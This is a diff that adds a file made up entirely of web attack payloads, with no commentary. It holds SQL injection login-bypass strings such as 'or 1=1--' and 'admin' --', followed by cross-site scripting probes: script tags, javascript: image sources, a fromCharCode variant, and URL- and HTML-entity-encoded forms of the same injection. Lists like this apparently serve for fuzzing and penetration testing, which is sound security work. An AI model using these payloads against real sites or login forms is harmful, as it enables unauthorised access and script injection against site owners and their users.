@@ -1,0 +1,21 @@
+```
+or 1=1
+or 1=1--
+'-'
+' '
+'&'
+'^'
+'*'
+' or ''-'
+admin' --
+admin' #
+"'><script>alert(1)</script>
+“”;</script><script>alert(/XSS/)</script><“
+"';</script><script>alert(/XSS/)</script><"
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
+'';!--"<XSS>=&{()}
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+%22%27%3E%3C%68%31%3E%78%73%73%3C%2F%68%31%3E
+&#x22;&#x27;&#x3E;&#x3C;&#x68;&#x31;&#x3E;&#x78;&#x73;&#x73;&#x3C;&#x2F;&#x68;&#x31;&#x3E;
+```
